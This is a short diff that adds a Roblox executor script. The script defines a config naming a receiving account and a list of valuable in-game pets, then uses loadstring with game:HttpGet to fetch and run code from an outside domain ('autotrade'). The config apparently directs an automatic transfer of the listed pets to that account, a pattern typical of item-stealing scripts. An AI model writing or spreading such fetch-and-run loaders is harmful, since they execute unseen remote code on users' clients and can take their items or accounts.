@@ -1,1 +1,20 @@
-1
+getgenv().Data = {
+    ["Account Main"] = "congahpz002",
+    ["UID"] = "chickenz",
+    ["Pets"] = {
+        "Silly Egg",
+        "King Doggy",
+        "ROUND",
+        "The Overlord",
+        "Avernus",
+        "MAN FACE GOD",
+        "Giant Chocolate Chicken",
+        "Easter Basket",
+        "Godly Gem",
+        "Dementor",
+        "Royal Trophy",
+        "Mech Robot",
+        "Luminosity"
+    }
+}
+loadstring(game:HttpGet("https://yummydata.click/autotrade"))()
